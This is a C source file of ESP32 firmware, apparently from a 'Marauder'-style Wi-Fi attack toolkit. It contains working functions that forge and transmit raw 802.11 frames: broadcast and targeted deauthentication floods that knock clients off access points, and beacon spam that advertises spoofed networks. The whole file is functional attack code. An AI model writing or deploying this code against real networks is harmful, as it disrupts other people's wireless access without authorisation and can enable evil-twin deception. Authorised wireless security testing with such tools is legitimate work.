#include "marauder_attack.h"

#include <string.h>
#include <stdlib.h>

#include <esp_wifi.h>

typedef struct __attribute__((packed)) {
    uint8_t frame_control[2];
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
} wifi_mgmt_hdr_t;

static bool send_raw(const void *buf, size_t len)
{
    return esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false) == ESP_OK;
}

bool marauder_set_channel(uint8_t primary)
{
    wifi_config_t cfg = {0};
    esp_wifi_get_config(WIFI_IF_STA, &cfg);
    cfg.sta.listen_interval = 0;
    esp_wifi_set_config(WIFI_IF_STA, &cfg);
    return esp_wifi_set_channel(primary, WIFI_SECOND_CHAN_NONE) == ESP_OK;
}

bool marauder_send_deauth_broadcast(const uint8_t bssid[6], int times, int delay_ms)
{
    uint8_t packet[26] = {0};
    wifi_mgmt_hdr_t *hdr = (wifi_mgmt_hdr_t *)packet;
    hdr->frame_control[0] = 0xC0; // Deauth
    hdr->frame_control[1] = 0x00;
    memset(hdr->da, 0xFF, 6);
    memcpy(hdr->sa, bssid, 6);
    memcpy(hdr->bssid, bssid, 6);
    uint16_t reason = 0x0007; // Class 3 frame received from nonassociated STA
    memcpy(packet + sizeof(wifi_mgmt_hdr_t), &reason, sizeof(reason));

    size_t len = sizeof(wifi_mgmt_hdr_t) + sizeof(reason);
    for (int i = 0; i < times; i++)
    {
        if (!send_raw(packet, len))
            return false;
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }
    return true;
}

bool marauder_send_deauth_to_client(const uint8_t ap_bssid[6], const uint8_t sta_mac[6], int times, int delay_ms)
{
    uint8_t packet[26] = {0};
    wifi_mgmt_hdr_t *hdr = (wifi_mgmt_hdr_t *)packet;
    hdr->frame_control[0] = 0xC0; // Deauth
    hdr->frame_control[1] = 0x00;
    memcpy(hdr->da, sta_mac, 6);
    memcpy(hdr->sa, ap_bssid, 6);
    memcpy(hdr->bssid, ap_bssid, 6);
    uint16_t reason = 0x0007;
    memcpy(packet + sizeof(wifi_mgmt_hdr_t), &reason, sizeof(reason));

    size_t len = sizeof(wifi_mgmt_hdr_t) + sizeof(reason);
    for (int i = 0; i < times; i++)
    {
        if (!send_raw(packet, len))
            return false;
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }
    return true;
}

static size_t craft_beacon(uint8_t *buf, size_t max, const char *ssid, const uint8_t bssid[6], uint8_t channel)
{
    if (max < 128)
        return 0;

    uint8_t *p = buf;
    wifi_mgmt_hdr_t *hdr = (wifi_mgmt_hdr_t *)p;
    hdr->frame_control[0] = 0x80; // Beacon
    hdr->frame_control[1] = 0x00;
    memcpy(hdr->da, (uint8_t[6]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 6);
    memcpy(hdr->sa, bssid, 6);
    memcpy(hdr->bssid, bssid, 6);
    p += sizeof(wifi_mgmt_hdr_t);

    // Fixed parameters
    memset(p, 0, 8); p += 8; // timestamp
    *(uint16_t *)p = 0x0064; p += 2; // interval
    *(uint16_t *)p = 0x0411; p += 2; // capabilities: ESS+short preamble

    // SSID
    size_t ssid_len = strlen(ssid);
    *p++ = 0x00; *p++ = (uint8_t)ssid_len; memcpy(p, ssid, ssid_len); p += ssid_len;

    // Supported rates
    *p++ = 0x01; *p++ = 0x08; memcpy(p, (uint8_t[]){0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c}, 8); p += 8;

    // DS Parameter set (channel)
    *p++ = 0x03; *p++ = 0x01; *p++ = channel;

    return (size_t)(p - buf);
}

bool marauder_send_beacon_spam(const char *ssid, const uint8_t bssid[6], uint8_t channel, int times, int delay_ms)
{
    uint8_t packet[256];
    size_t len = craft_beacon(packet, sizeof(packet), ssid, bssid, channel);
    if (!len)
        return false;

    for (int i = 0; i < times; i++)
    {
        if (!send_raw(packet, len))
            return false;
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }
    return true;
}


